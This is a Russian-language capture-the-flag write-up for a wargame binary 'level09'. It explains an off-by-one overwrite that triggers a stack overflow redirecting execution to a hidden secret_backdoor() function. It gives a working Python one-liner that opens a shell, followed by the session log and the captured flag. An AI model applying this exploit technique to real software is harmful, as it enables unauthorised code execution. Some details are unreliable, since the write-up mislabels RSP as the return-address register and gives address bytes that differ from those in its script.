Бинарный файл level09 просто запрашивает, затем копирует имя пользователя и сообщение.

C помощью GDB, мы находим скрытую функцию secret_backdoor(), которая считывает буфер из stdin,
затем вызывает system() с агументом из буфера.
Воспользуемся этим, перейдем к secret_backdoor() и ввести "/bin/sh" в stdin, чтобы получить доступ.

Уязвимость: Off-by-one error

Цикл копирования имени пользователя содержит уязвимость «Off-by-one error»,
которая позволяет пользователю перезаписать переменную msg_len одним байтом.
Размер msg_len больше, чем по умолчанию (40), может привести к переполнению буфера функции strncpy при копировании Msg.
Заполним 40-байтовый буфер имени пользователя, затем переполним его на 1 байт, записав 1 байт (0xff) в msg_len.
В результате, программа завершиться с ошибкой Segmentation fault.

Теперь мы перепишем адрес возврата этой функции адресом, который указывает на secret_backdoor.
В 64-битном бинарном файле, RSP (не EIP как в 32-битном) - это регистр адреса возврата.
Опытным путем в GDB выясняем, что переполнение RSP начинается после 200 байт,
в этом месте мы можем вставить нужный нам аддрес возврата.
Адрес функции мы найдем с помощью GDB:
	gdb level09
	(gdb) x secret_backdoor
	0x88c <secret_backdoor>:	0xe5894855									#Адрес функции

Построить эксплойт

	1. 40-байтовый буфер имени пользователя, до переполнения len: "." * 40
	2. 1 байт, максимальное значение, перезапись len: "\xff"
	3. новая строка, "введите имя пользователя": "\n"
	4. 200 байт msg буфер, до переполнения RSP: «,» * 200
	5. перезаписать RSP с адресом secret_backdoor(): "\x8c\x48\x55\x55\x55\x00"
	6. новая строка, "введите сообщение": "\n"
	7. system() открыть команду оболочки: "/bin/sh"
	8. Давайте отправим нашу строку эксплойта в ан ввод в бинарный файл level09.

Script:

(python -c 'print "." * 40 + "\xff" + "\n" + "," * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'; cat) | ./level09

	--------------------------------------------
	|   ~Welcome to l33t-m$n ~    v1337        |
	--------------------------------------------
	>: Enter your username
	>>: >: Welcome, ........................................?>: Msg @Unix-Dude
	>>: >: Msg sent!
	whoami
	end
	cat .pass
	cat: .pass: Permission denied
	cd ../end 
	cat .pass
	j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE								#flag 
